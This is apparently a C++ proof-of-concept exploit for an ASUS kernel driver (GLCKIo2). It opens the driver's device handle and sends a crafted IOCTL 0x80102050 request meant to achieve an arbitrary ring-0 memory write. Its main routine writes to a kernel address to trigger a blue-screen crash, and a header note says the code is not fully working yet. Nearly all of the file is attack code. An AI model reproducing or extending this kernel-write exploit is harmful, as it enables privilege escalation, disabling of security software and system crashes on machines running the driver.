//INFO - Running this application will cause an inital hit on the target code and then end hit enter to send the payload to access the code path into the code at ioctl 0x80102050 (IMPORTANT: Not working fully yet MmGetSystemRoutineAddress is doing something so debug tomorrow)
//
//
#include <windows.h>
#include <iostream>
#include <vector>
#include <random>
#include <string>
#include <winternl.h>

// Define IOCTL code
#define IOCTL_GLCKIO_VMWRITE 0x80102050

// Device name
#define DEVICE_NAME "\\\\.\\GLCKIo2"

// Structure definition for GLCKIO write
typedef struct _STRUCT_GLCKIO_VMWRITE {
    WORD magic_number;    // [0x00]
    DWORD value;          // [0x02]
    WORD padding;         // [0x06]
    ULONG64 unk2;         // [0x08]
    ULONG64 unk3;         // [0x10]
    ULONG64 ioctl_code;   // [0x18] <- Explicitly setting the IOCTL code
    ULONG64 dest_address; // [0x20]
    ULONG64 unk6;         // [0x28]
} STRUCT_GLCKIO_VMWRITE;

HANDLE ghDriver = 0;

BOOL ArbitraryWriteDWORD(ULONG64 dest, DWORD value)
{
    STRUCT_GLCKIO_VMWRITE mystructIn = { 0 };
    mystructIn.magic_number = 0x0E; // New magic number
    mystructIn.value = value;        // Value to write
    mystructIn.ioctl_code = IOCTL_GLCKIO_VMWRITE; // Set IOCTL code
    mystructIn.dest_address = dest;  // Destination address

    STRUCT_GLCKIO_VMWRITE mystructOut = { 0 };

    DWORD returned = 0;

    BOOL result = DeviceIoControl(
        ghDriver,
        IOCTL_GLCKIO_VMWRITE,
        (LPVOID)&mystructIn,
        sizeof(mystructIn),
        (LPVOID)&mystructOut,
        sizeof(mystructOut),
        &returned,
        NULL
    );

    if (!result) {
        DWORD error = GetLastError();
        std::cerr << "[ERROR] IOCTL 0x" << std::hex << IOCTL_GLCKIO_VMWRITE
            << " failed with error " << std::dec << error
            << " | Input Size: " << sizeof(mystructIn) << std::endl;
        return FALSE;
    }
    else {
        std::cout << "[SUCCESS] IOCTL 0x" << std::hex << IOCTL_GLCKIO_VMWRITE
            << " succeeded. Bytes returned: " << returned
            << " | Input Size: " << sizeof(mystructIn) << std::endl;
        return TRUE;
    }
}

BOOL InitDriver()
{
    ghDriver = CreateFileA(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );
    if (ghDriver == INVALID_HANDLE_VALUE) {
        std::cerr << "Cannot get handle to GLCKIo2 driver - GetLastError:" << GetLastError() << std::endl;
        return FALSE;
    }
    return TRUE;
}

int main()
{
    std::cout << "ASUS GLKIo2 PoC (possible arbitrary ring0 write)" << std::endl;

    if (!InitDriver()) {
        return 1;
    }

    std::cout << "Press ENTER for instant BSOD" << std::endl;
    getchar();

    ArbitraryWriteDWORD(0xfffff802deadbeef, 0xdeadbeef);

    CloseHandle(ghDriver);
    return 0;
}
